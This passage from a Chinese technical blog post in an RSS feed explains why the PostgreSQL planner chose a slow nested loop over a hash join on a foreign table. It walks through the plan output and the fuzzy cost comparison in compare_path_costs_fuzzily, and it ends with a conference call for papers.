Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> Â <span class="hljs-keyword">Foreign</span> Scan <span class="hljs-keyword">on</span> instance_info Â (cost<span class="hljs-operator">=</span><span class="hljs-number">100.00</span>.<span class="hljs-number">.116</span><span class="hljs-number">.30</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> width<span class="hljs-operator">=</span><span class="hljs-number">150</span>) (actual <span class="hljs-type">time</span><span class="hljs-operator">=</span><span class="hljs-number">1.290</span>.<span class="hljs-number">.103</span><span class="hljs-number">.183</span> <span class="hljs-keyword">rows</span><span class="hljs-operator">=</span><span class="hljs-number">8805.00</span> loops<span class="hljs-operator">=</span><span class="hljs-number">2293</span>)
Â Planning:
Â  Â Buffers: shared hit<span class="hljs-operator">=</span><span class="hljs-number">173</span>
Â Planning <span class="hljs-type">Time</span>: <span class="hljs-number">1.516</span> ms
Â Execution <span class="hljs-type">Time</span>: <span class="hljs-number">244953.762</span> ms
(<span class="hljs-number">17</span> <span class="hljs-keyword">rows</span>)

test<span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>
</code></pre>
<p>ä¸€èˆ¬é‡åˆ°è¿™ç§æƒ…å†µï¼Œè‚¯å®šæ˜¯å°è¯•â€œå…³é—­â€nestloop è¯•è¯•çœ‹ï¼Œèµ°äº† Hashjoin åæ‰§è¡Œè€—æ—¶ä»… 287msï¼Œæ€§èƒ½æå‡å¿« 1000 å€ã€‚</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">test</span>=&gt;Â setÂ enable_nestloopÂ to<span class="hljs-literal">off</span><span class="hljs-comment">;</span>
SET
<span class="hljs-attr">test</span>=&gt;Â explainÂ analyzeÂ selectÂ count(*),zone_idÂ fromÂ instance_infoÂ whereÂ instanceidÂ inÂ (SELECTÂ instanceid
FROM
Â  Â  instance_info
<span class="hljs-attr">wherevisible</span>Â =Â <span class="hljs-number">1</span>
GROUPBY
Â  Â  instanceid
HAVING
Â  Â Â COUNT(DISTINCTÂ zone_id) &gt;Â 1)Â <span class="hljs-attr">andvisible</span>Â =Â <span class="hljs-number">1</span>groupbyÂ zone_id<span class="hljs-comment">;</span>
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  QUERY PLAN Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â 
----------------------------------------------------------------------------------------------------------------------------------------------
Â GroupAggregate Â (<span class="hljs-attr">cost</span>=<span class="hljs-number">232.44</span>..<span class="hljs-number">232.46</span> rows=<span class="hljs-number">1</span> width=<span class="hljs-number">12</span>) (actual time=<span class="hljs-number">273.475</span>..<span class="hljs-number">274.907</span> rows=<span class="hljs-number">4.00</span> loops=<span class="hljs-number">1</span>)
Â  Â Group Key: instance_info.zone_id
Â  Â Buffers: shared <span class="hljs-attr">hit</span>=<span class="hljs-number">3</span>
Â  Â -&gt; Â Sort Â (<span class="hljs-attr">cost</span>=<span class="hljs-number">232.44</span>..<span class="hljs-number">232.45</span> rows=<span class="hljs-number">1</span> width=<span class="hljs-number">4</span>) (actual time=<span class="hljs-number">273.006</span>..<span class="hljs-number">273.722</span> rows=<span class="hljs-number">4588.00</span> loops=<span class="hljs-number">1</span>)
Â  Â  Â  Â  Â Sort Key: instance_info.zone_id
Â  Â  Â  Â  Â Sort Method: quicksort Â Memory: 193kB
Â  Â  Â  Â  Â Buffers: shared <span class="hljs-attr">hit</span>=<span class="hljs-number">3</span>
Â  Â  Â  Â  Â -&gt; Â Hash Join Â (<span class="hljs-attr">cost</span>=<span class="hljs-number">216.13</span>..<span class="hljs-number">232.43</span> rows=<span class="hljs-number">1</span> width=<span class="hljs-number">4</span>) (actual time=<span class="hljs-number">160.901</span>..<span class="hljs-number">271.843</span> rows=<span class="hljs-number">4588.00</span> loops=<span class="hljs-number">1</span>)
Â  Â  Â  Â  Â  Â  Â  Â Hash Cond: ((instance_info.instanceid)::<span class="hljs-attr">text</span> = (instance_info_1.instanceid)::text)
Â  Â  Â  Â  Â  Â  Â  Â -&gt; Â Foreign Scan on instance_info Â (<span class="hljs-attr">cost</span>=<span class="hljs-number">100.00</span>..<span class="hljs-number">116.30</span> rows=<span class="hljs-number">2</span> width=<span class="hljs-number">150</span>) (actual time=<span class="hljs-number">4.691</span>..<span class="hljs-number">109.722</span> rows=<span class="hljs-number">8805.00</span> loops=<span class="hljs-number">1</span>)
Â  Â  Â  Â  Â  Â  Â  Â -&gt; Â Hash Â (<span class="hljs-attr">cost</span>=<span class="hljs-number">116.12</span>..<span class="hljs-number">116.12</span> rows=<span class="hljs-number">1</span> width=<span class="hljs-number">146</span>) (actual time=<span class="hljs-number">156.185</span>..<span class="hljs-number">156.186</span> rows=<span class="hljs-number">2293.00</span> loops=<span class="hljs-number">1</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Buckets: 4096 (originally 1024) Â Batches: 1 (originally 1) Â Memory Usage: 144kB
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â -&gt; Â Foreign Scan Â (<span class="hljs-attr">cost</span>=<span class="hljs-number">100.01</span>..<span class="hljs-number">116.12</span> rows=<span class="hljs-number">1</span> width=<span class="hljs-number">146</span>) (actual time=<span class="hljs-number">21.939</span>..<span class="hljs-number">155.037</span> rows=<span class="hljs-number">2293.00</span> loops=<span class="hljs-number">1</span>)
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Relations: Aggregate on (instance_info instance_info_1)
Â Planning Time: 0.242 ms
Â Execution Time: 287.414 ms
(16 rows)

<span class="hljs-attr">test</span>=&gt;Â 
</code></pre>
<p>ä¸ºä»€ä¹ˆä¼˜åŒ–å™¨èµ°äº†æ•ˆç‡æ›´å·®çš„ nested loopï¼Ÿ</p>
<p>ç»Ÿè®¡ä¿¡æ¯ä¸å‡†ï¼Ÿä¼˜åŒ–å™¨ä»£ä»·è®¡ç®—åå·®ï¼Ÿ</p>
<h2 data-id="heading-1">é—®é¢˜åˆ†æ</h2>
<p>ä» nestloop å’Œ Hashjoin å¯¹åº” path çš„æœ€ç»ˆ cost æ¥çœ‹</p>
<p>GroupAggregate Â (cost=232.45..232.47ï¼‰</p>
<p>GroupAggregate Â (cost=232.44..232.46)</p>
<p>åè€…å¯¹åº” path æœ€ç»ˆçš„ startup_cost å’Œ total_cost éƒ½è¦å°ï¼Œä¸ºä»€ä¹ˆä¼˜åŒ–å™¨æ²¡æœ‰é€‰æ‹© Hashjoin è¿™æ¡è·¯å¾„ï¼Ÿ</p>
<p>æ‰€ä»¥è¿™é‡Œä¼šæœ‰ä¸€ä¸ªè¯¯åŒºï¼šè€æ¨ä¹Ÿæ›¾ä»¥ä¸ºä¼˜åŒ–å™¨é€‰æ‹©æœ€ä¼˜æ‰§è¡Œè®¡åˆ’ï¼Œè‚¯å®šæ˜¯ç”Ÿæˆæ¯ç§è·¯å¾„åï¼Œæ¯”è¾ƒæœ€ç»ˆçš„ costï¼Œæœ€ç»ˆ cost æœ€å°çš„ä¸ºæœ€ä¼˜è®¡åˆ’ã€‚</p>
<p>äº‹å®ä¸Šåœ¨ add_path ç”Ÿæˆè·¯å¾„çš„è¿‡ç¨‹ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šè¿›è¡Œ cost æ¯”è¾ƒï¼Œå¯èƒ½é‡‡ç”¨ new_pathï¼Œæˆ–è€…ä¿ç•™ old_pathï¼Œæˆ–è€…éƒ½ä¿ç•™ã€‚æ¯”å¦‚è¯´åœ¨ç”Ÿæˆ Joinpath æ—¶ï¼Œå¯èƒ½åªä¿ç•™äº†ä¸€ç§ JoinMethod è¿›å…¥ä¸‹ä¸€è®¡åˆ’èŠ‚ç‚¹ï¼Œç”Ÿæˆæœ€ç»ˆæ‰§è¡Œè®¡åˆ’ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4728c512ba0a4b749093f7e654bbd4ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZvcnlTUUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770275940&amp;x-signature=j32UdIfzHmtVp1jlu9dQWctHw2I%3D" alt="01.png" loading="lazy"/></p>
<p>é‚£ä¹ˆè¿™ä¸ªæ¡ˆä¾‹ä¸­æœ‰æ²¡æœ‰å¯èƒ½æ˜¯ Hashjoin åœ¨ Joinpath ç¯èŠ‚è¢«â€œæ·˜æ±°äº†â€ï¼Ÿ</p>
<p>Nested Loop Â (cost=200.01..232.44 rows=1 width=4)</p>
<p>Hash Join Â (cost=216.13..232.43 rows=1 width=4)</p>
<p>ä» cost æ¥çœ‹ï¼Œä¸¤ç§è·¯å¾„çš„ cost æ¯”è¾ƒæ¥è¿‘ï¼Œç”±äºä¹‹å‰ç ”ç©¶è¿‡è¿™é‡Œï¼Œæˆ‘å·²ç»å¤§æ¦‚çŒœåˆ°é—®é¢˜çš„åŸå› äº†ã€‚</p>
<p>åœ¨ add_path ç”Ÿæˆè·¯å¾„æ—¶ï¼Œé¦–å…ˆä½¿ç”¨æ¨¡ç³Š cost æ¯”è¾ƒæ¥å†³å®šè·¯å¾„çš„å»ç•™ã€‚</p>
<p>cost æ¨¡ç³Šæ¯”è¾ƒå‡½æ•°ä¸º<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpostgres%2Fpostgres%2Fblob%2FREL_18_0%2Fsrc%2Fbackend%2Foptimizer%2Futil%2Fpathnode.c%23L185" title="https://github.com/postgres/postgres/blob/REL_18_0/src/backend/optimizer/util/pathnode.c#L185" target="_blank" ref="nofollow noopener noreferrer">compare_path_costs_fuzzily</a>
[1]
ï¼š</p>
<p>path1 å³ new_path ä¸º HashPathï¼Œpath2 å³ old_path ä¸º NestPathã€‚</p>
<ul>
<li><strong>é¦–å…ˆæ¯”è¾ƒä¸¤æ¡è·¯å¾„çš„ disabled_nodes</strong>ã€‚</li>
</ul>
<p>enable_nestloop å’Œ enable_hashjoin å‡ä¸º onï¼Œæ‰€ä»¥ disabled_nodes å‡ä¸º 0ã€‚</p>
<ul>
<li>
<p><strong>è‹¥æœªæœï¼Œå†æ¯”è¾ƒ total_costï¼Œå¹¶é€šè¿‡æ¨¡ç³Šç³»æ•°å°†è·¯å¾„ cost æå‡ 1%ï¼Œå’Œå¦å¤–ä¸€æ¡è·¯å¾„æ¯”è¾ƒ</strong>ã€‚</p>
<p>232.43 &gt; 232.44 _ 1.01 å’Œ 232.44 &gt; 232.43 _ 1.01 å‡ä¸æˆç«‹ï¼Œtotal_cost æ¨¡ç³Šè¿‘ä¼¼ã€‚</p>
</li>
<li>
<p><strong>è‹¥æœªæœï¼Œå†æ¯”è¾ƒ startup_costï¼Œå¹¶é€šè¿‡æ¨¡ç³Šç³»æ•°å°†è·¯å¾„ cost æå‡ 1%ï¼Œå’Œå¦å¤–ä¸€æ¡è·¯å¾„æ¯”è¾ƒ</strong>ã€‚</p>
<p>216.13 &gt; 200.01 * 1.01 æ‰€ä»¥è¿”å› COSTS_BETTER2ã€‚</p>
</li>
</ul>
<p>ç»è¿‡æ¯”è¾ƒç¡®å®šä¸¤æ¡è·¯å¾„ä¸­æ›´ä¼˜è·¯å¾„ä¸º NestPathã€‚ é‚£ä¹ˆ HashPath å°±è¢«æ·˜æ±°äº†ï¼Œç„¶åè¿›è¡Œåç»­ SORT å’Œ AGG èŠ‚ç‚¹çš„ path ç”Ÿæˆã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">static</span>Â PathCostComparison
<span class="hljs-title function_ invoke__">compare_path_costs_fuzzily</span>(Path *path1, Path *path2,Â doubleÂ fuzz_factor)
{
#defineÂ <span class="hljs-title function_ invoke__">CONSIDER_PATH_STARTUP_COST</span>(p) Â \
Â ((p)<span class="hljs-punctuation">-&gt;</span>param_info == NULL ? (p)<span class="hljs-punctuation">-&gt;</span>parent<span class="hljs-punctuation">-&gt;</span>consider_startup : (p)<span class="hljs-punctuation">-&gt;</span>parent<span class="hljs-punctuation">-&gt;</span>consider_param_startup)

<span class="hljs-comment">/* Number of disabled nodes, if different, trumps all else. */</span>
<span class="hljs-title function_ invoke__">if</span>Â (<span class="hljs-title function_ invoke__">unlikely</span>(path1<span class="hljs-punctuation">-&gt;</span>disabled_nodes != path2<span class="hljs-punctuation">-&gt;</span>disabled_nodes))
Â {
<span class="hljs-title function_ invoke__">if</span>Â (path1<span class="hljs-punctuation">-&gt;</span>disabled_nodes &lt; path2<span class="hljs-punctuation">-&gt;</span>disabled_nodes)
Â  Â <span class="hljs-keyword">return</span>Â COSTS_BETTER1;
<span class="hljs-keyword">else</span>
Â  Â <span class="hljs-keyword">return</span>Â COSTS_BETTER2;
Â }

<span class="hljs-comment">/*
Â  * Check total cost first since it's more likely to be different; many
Â  * paths have zero startup cost.
Â  */</span>
<span class="hljs-title function_ invoke__">if</span>Â (path1<span class="hljs-punctuation">-&gt;</span>total_cost &gt; path2<span class="hljs-punctuation">-&gt;</span>total_cost * fuzz_factor)
Â {
<span class="hljs-comment">/* path1 fuzzily worse on total cost */</span>
<span class="hljs-title function_ invoke__">if</span>Â (<span class="hljs-title function_ invoke__">CONSIDER_PATH_STARTUP_COST</span>(path1) &amp;&amp;
Â  Â path2<span class="hljs-punctuation">-&gt;</span>startup_cost &gt; path1<span class="hljs-punctuation">-&gt;</span>startup_cost * fuzz_factor)
Â  {
Â  Â <span class="hljs-comment">/* ... but path2 fuzzily worse on startup, so DIFFERENT */</span>
Â  Â <span class="hljs-keyword">return</span>Â COSTS_DIFFERENT;
Â  }
<span class="hljs-comment">/* else path2 dominates */</span>
<span class="hljs-keyword">return</span>Â COSTS_BETTER2;
Â }
<span class="hljs-title function_ invoke__">if</span>Â (path2<span class="hljs-punctuation">-&gt;</span>total_cost &gt; path1<span class="hljs-punctuation">-&gt;</span>total_cost * fuzz_factor)
Â {
<span class="hljs-comment">/* path2 fuzzily worse on total cost */</span>
<span class="hljs-title function_ invoke__">if</span>Â (<span class="hljs-title function_ invoke__">CONSIDER_PATH_STARTUP_COST</span>(path2) &amp;&amp;
Â  Â path1<span class="hljs-punctuation">-&gt;</span>startup_cost &gt; path2<span class="hljs-punctuation">-&gt;</span>startup_cost * fuzz_factor)
Â  {
Â  Â <span class="hljs-comment">/* ... but path1 fuzzily worse on startup, so DIFFERENT */</span>
Â  Â <span class="hljs-keyword">return</span>Â COSTS_DIFFERENT;
Â  }
<span class="hljs-comment">/* else path1 dominates */</span>
<span class="hljs-keyword">return</span>Â COSTS_BETTER1;
Â }
<span class="hljs-comment">/* fuzzily the same on total cost ... */</span>
<span class="hljs-title function_ invoke__">if</span>Â (path1<span class="hljs-punctuation">-&gt;</span>startup_cost &gt; path2<span class="hljs-punctuation">-&gt;</span>startup_cost * fuzz_factor)
Â {
<span class="hljs-comment">/* ... but path1 fuzzily worse on startup, so path2 wins */</span>
<span class="hljs-keyword">return</span>Â COSTS_BETTER2;
Â }
<span class="hljs-title function_ invoke__">if</span>Â (path2<span class="hljs-punctuation">-&gt;</span>startup_cost &gt; path1<span class="hljs-punctuation">-&gt;</span>startup_cost * fuzz_factor)
Â {
<span class="hljs-comment">/* ... but path2 fuzzily worse on startup, so path1 wins */</span>
<span class="hljs-keyword">return</span>Â COSTS_BETTER1;
Â }
<span class="hljs-comment">/* fuzzily the same on both costs */</span>
<span class="hljs-keyword">return</span>Â COSTS_EQUAL;

#undefÂ CONSIDER_PATH_STARTUP_COST
}
</code></pre>
<p><strong>debug åšä¸‹éªŒè¯ï¼š</strong></p>
<p>åœ¨ç”Ÿæˆ Joinpath æ—¶ï¼Œä¾æ¬¡ç”Ÿæˆ MergePathã€NestPathã€HashPath å¹¶è¿›è¡Œ cost æ¨¡ç³Šæ¯”è¾ƒã€‚</p>
<p>è¿™é‡Œçœå» MergePath å’Œ NestPath çš„æ¯”è¾ƒè¿‡ç¨‹ï¼ŒNestPath èƒœå‡ºã€‚</p>
<p>å½“ç”Ÿæˆ HashPath åï¼Œå’Œ NestPath æ¯”è¾ƒ Total_cost å·®å¼‚å¹¶æœªè¾¾åˆ° 1%ã€‚è€Œè¿›ä¸€æ­¥æ¯”è¾ƒ startup_costï¼Œæ˜æ˜¾å·®å¼‚å¤§äº 1%æ‰€ä»¥è¿”å› COSTS_BETTER2ï¼Œå³ NestPath èƒœå‡ºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7443200633b4a21be0d517f218be3c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZvcnlTUUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770275940&amp;x-signature=hJVzPv3TJfGQOVq%2Bm7PIs2kKmSE%3D" alt="02.png" loading="lazy"/></p>
<p>case COSTS_BETTER2ï¼šå½“å‰æ»¡è¶³ outercmp == BMS_EQUAL ç­‰æ¡ä»¶ï¼Œå°† accept_new ç½®ä¸º false.</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a256a3c5c414b4880d03201ca35b280~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZvcnlTUUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770275940&amp;x-signature=GaT4cc9FswIrHqh4hVpdS%2BFHDRA%3D" alt="03.png" loading="lazy"/></p>
<p>accept_new ä¸º falseï¼Œæ‰€ä»¥æ‹’ç»å¹¶ä¸”å›æ”¶äº† new_pathï¼Œä¹Ÿå°±æ˜¯ HashPath è¢«æ·˜æ±°äº†ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3751ee09745f4e909d442f330bafe277~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZvcnlTUUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770275940&amp;x-signature=OM3pS9wlkwU3Fun9jZjyiJt2E9I%3D" alt="04.png" loading="lazy"/></p>
<p>ç»è¿‡ cost ç²¾ç¡®æ¯”è¾ƒï¼Œè§’é€å‡º cheapest_total_cost å’Œ cheapest_startup_cost éƒ½ä¸º NestPathã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d57cfd17a19e4e9386a014cf4930d7e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZvcnlTUUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770275940&amp;x-signature=zLSLKyW0ll%2F1pSdGNtD0Fd0PpUU%3D" alt="05.png" loading="lazy"/></p>
<p>æœ€ç»ˆï¼Œä½¿ç”¨ best_path å»ç”Ÿæˆæ‰§è¡Œè®¡åˆ’ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d201c3a08d38450e852cfac3cd57ff1a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSXZvcnlTUUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770275940&amp;x-signature=2bgIDJ4U%2BzAPDg57mFX9aKtLERg%3D" alt="06.png" loading="lazy"/></p>
<p>åˆ°è¿™é‡Œï¼Œ<strong>å¤§å®¶å·²ç»æ„Ÿè§‰åˆ°è¿™ä¸ª cost æ¨¡ç³Šæ¯”è¾ƒæœ‰å‘äº†å§ï¼Œç‰¹åˆ«å½“ä¸¤æ¡è·¯å¾„çš„ cost å·®åˆ«æ¯”è¾ƒå°ï¼Œtotal_cost æˆ–è€… startup_cost å·®åˆ«å°äº 1%æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´é€‰é”™è·¯å¾„ï¼Œæœ€ç»ˆç”Ÿæˆäº†ä¸€ä¸ªæ¬¡ä¼˜è®¡åˆ’ã€‚</strong></p>
<p>STD_FUZZ_FACTOR é»˜è®¤å°±æ˜¯ 1.01ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥æŠŠå®ƒè°ƒæ•´å¾—æ›´å°ï¼Œè¿™æ ·å°±èƒ½æ›´ç²¾å‡†ï¼Ÿä½†å¾—æ…é‡ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¼˜åŒ–å™¨æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œå¼„ä¸å¥½çœŸæ˜¯ç‰µä¸€å‘åˆ™åŠ¨å…¨èº«ã€‚æˆ‘è§‰å¾—è¿™ä¸ªæ¨¡ç³Šæ¯”è¾ƒç›®å‰çœ‹èµ·æ¥ä¸å¤ªä¼˜é›…ï¼Œç”šè‡³åç»­ç‰ˆæœ¬æœ‰å¯èƒ½å»é™¤è¿™é‡Œçš„é€»è¾‘ï¼Œå½“ç„¶å„ä½æœ‰æƒ³æ³•çš„è¯å¯ä»¥å‘åˆ°ç¤¾åŒºå’Œ Tom Lane ä¸€ä¼—å¤§ä½¬ solo ä¸‹ã€‚</p>
<p>å½“ç„¶ä¸èƒ½æŒ‡æœ›ä¼˜åŒ–å™¨ä¸€ç›´éƒ½æ˜¯æœ€æ­£ç¡®çš„ï¼Œè¿™æ˜¯è¿èƒŒç°å®çš„ï¼Œæˆ‘ä¹‹å‰ä¹Ÿå†™äº†å¾ˆå¤šç¯‡æ–‡ç« ï¼Œå¤šæ¬¡åˆ†äº«ç›¸å…³çš„å†…å®¹ã€‚</p>
<p>okï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿™ä¸ª case èµ°äº†ä¸ä¼˜è®¡åˆ’ï¼Œå¤§å®¶åº”è¯¥éƒ½æ¸…æ¥šäº†ã€‚å¯èƒ½å·²ç»æœ‰æœ‹å‹çœ‹å‡ºæ¥è¿˜æœ‰ç‚¹å°é—®é¢˜ï¼ŒForeign table é¢„ä¼°æ‰«æ 1 è¡Œï¼Œå®é™…æ‰«æäº† 2000+è¡Œï¼Œè‚¯å®šæ˜¯ç»Ÿè®¡ä¿¡æ¯ä¸å‡†å•Šï¼Ÿ</p>
<p>å¤§å®¶æ€è€ƒä¸‹ Foreign table æœ‰ç»Ÿè®¡ä¿¡æ¯å—ï¼Ÿ</p>
<p>sureï¼Œç¯‡å¹…é—®é¢˜ï¼Œæˆ‘ç®€è¿°ä¸‹åŸç†ï¼šForeign table åªæ˜¯è¡¨æ˜ å°„ï¼Œæ²¡æœ‰ç‰©ç†å…ƒç»„ï¼Œå®ƒçš„ç»Ÿè®¡ä¿¡æ¯ï¼Œæ˜¯é€šè¿‡ fdw è®¿é—®ç›®çš„ç«¯è¡¨è¿›è¡Œé‡‡é›†çš„ã€‚ ä½†æ˜¯åªèƒ½æ‰‹åŠ¨æŒ¡ï¼Œå› ä¸º Foreign table æ²¡æ³•è¿›è¡Œ vacuum/autovacuumï¼Œéœ€è¦æ‰‹åŠ¨ analyze è§¦å‘ã€‚</p>
<p>ç¤ºä¾‹çš„è¡¨æˆ‘åšäº†ä¸‹ analyzeï¼Œæ›´æ–°äº†ä¸‹ç»Ÿè®¡ä¿¡æ¯ï¼Œå„ç§ path çš„ cost å·®å¼‚æ¯”è¾ƒå¤§ï¼Œé»˜è®¤èµ°äº† Hashjoinã€‚</p>
<p>å› æ­¤ï¼Œä¸€å®šè¦å®šæ—¶æ”¶é›†å¤–è¡¨ç»Ÿè®¡ä¿¡æ¯ï¼Œä¸ç„¶å¯èƒ½ä¼šæ‹–å®æ•´ä¸ªå®ä¾‹ã€‚</p>
<h2 data-id="heading-2">å°ç»“</h2>
<p>æœ¬ç¯‡æˆ‘ä»¬åˆ†æäº†ä¸€ä¾‹æ‰§è¡Œè®¡åˆ’è·‘åçš„æ ¹æœ¬åŸå› ï¼Œä»ä¸­çœ‹å¾—åˆ°å½“è·¯å¾„é—´çš„ cost æ¥è¿‘æ—¶ï¼ˆ1%ä»¥ä¸‹ï¼‰ï¼Œå¯èƒ½åœ¨ add_path æ—¶ cost æ¨¡ç³Šæ¯”è¾ƒä¸­ä¼šé€‰æ‹©æ¬¡ä¼˜è·¯å¾„ï¼Œç”Ÿæˆä¸ä¼˜è®¡åˆ’ã€‚</p>
<p>å½“ç„¶é‡åˆ°è¿™æ ·çš„åœºæ™¯å¯ä»¥å°è¯•å„ç§ hint æ‰‹æ®µå»å¹²é¢„ï¼Œä¸è¿‡å¯ä»¥è€ƒè™‘åˆ©ç”¨å¼ºåŒ–å­¦ä¹ æ¥å®ç°è‡ªåŠ¨åŒ–çš„ hint å¹²é¢„ï¼Œè®©æ•°æ®åº“è‡ªåŠ¨ç®¡ç†æ‰§è¡Œè®¡åˆ’ã€‚æˆ‘åœ¨ä¹‹å‰çš„æ–‡ç« ã€ŠAI4DB è¯•ç©-Bao/Balsa é€‚é… PG18ã€‹ä¸­ç ”ç©¶è¿‡ç±»ä¼¼çš„æ¨¡å‹ï¼Œå¹¶åœ¨ PCC2025 å¤§ä¼šä¸­åšäº†åˆ†äº«ã€‚</p>
<p>å½“ç„¶ä¸“ä¸šçš„äº‹è¦ä¸“ä¸šçš„äººæ¥åšï¼Œæˆ‘ä»¬çš„å¥½å‹å´”é¹åšå£«å·²æœ‰ç›¸å…³çš„ AI4DB è¯¾é¢˜ç ”ç©¶å’Œè½åœ°ï¼Œå°†ä¼šåœ¨ HOW2026 å¤§ä¼šä¸­ä¸å¤§å®¶è§é¢ï¼Œæ•¬è¯·æœŸå¾…ã€‚</p>
<hr/>
<h2 data-id="heading-3"><a href="https://link.juejin.cn?target=https%3A%2F%2Fjsj.top%2Ff%2FuebqBc" target="_blank" title="https://jsj.top/f/uebqBc" ref="nofollow noopener noreferrer">HOW 2026 è®®é¢˜æ‹›å‹Ÿä¸­</a></h2>
<p>2026 å¹´ 4 æœˆ 27-28 æ—¥ï¼Œç”± IvorySQL ç¤¾åŒºè”åˆ PGEUï¼ˆæ¬§æ´² PG ç¤¾åŒºï¼‰ã€PGAsiaï¼ˆäºšæ´² PG ç¤¾åŒºï¼‰å…±åŒæ‰“é€ çš„ HOW 2026ï¼ˆIvorySQL &amp; PostgreSQL æŠ€æœ¯å³°ä¼šï¼‰ å°†å†åº¦è½åœ°æµå—ã€‚å±Šæ—¶ï¼ŒPostgreSQL è”åˆåˆ›å§‹äºº Bruce Momjian ç­‰é¡¶çº§å¤§å¸ˆå°†äº²ä¸´ç°åœºã€‚</p>
<p>è‡ªå¼€å¯å¾é›†ä»¥æ¥ï¼ŒHOW 2026 ç­¹å¤‡ç»„å·²æ„Ÿå—åˆ°æ¥è‡ªå…¨çƒ PostgreSQL çˆ±å¥½è€…çš„æ¾æ¹ƒçƒ­æƒ…ã€‚ä¸ºäº†ç¡®ä¿å¤§ä¼šè®®é¢˜çš„æ·±åº¦ä¸å¹¿åº¦ï¼Œæˆ‘ä»¬è¯šé‚€æ‚¨åœ¨ 2026 å¹´ 2 æœˆ 27 æ—¥æˆªæ­¢æ—¥æœŸå‰ï¼Œæäº¤æ‚¨çš„æŠ€æœ¯è§è§£ã€‚</p>
<p>æŠ•é€’é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjsj.top%2Ff%2FuebqBc" target="_blank" title="https://jsj.top/f/uebqBc" ref="nofollow noopener noreferrer">jsj.top/f/uebqBc</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - ç¼–è¯‘åŸç† [6 - 2]ï¼šBabel æ’ä»¶å¼€å‘ä¸è®¿é—®è€…æ¨¡å¼]]></title>    <link>https://juejin.cn/post/7600581247019679753</link>    <guid>https://juejin.cn/post/7600581247019679753</guid>    <pubDate>2026-01-29T07:37:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600581247019679753" data-draft-id="7600489282838986762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å‘æ¶æ„çªå›´ç³»åˆ— - ç¼–è¯‘åŸç† [6 - 2]ï¼šBabel æ’ä»¶å¼€å‘ä¸è®¿é—®è€…æ¨¡å¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-29T07:37:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯ç‹å£®å£®"/> <meta itemprop="url" content="https://juejin.cn/user/4473272506789485"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta 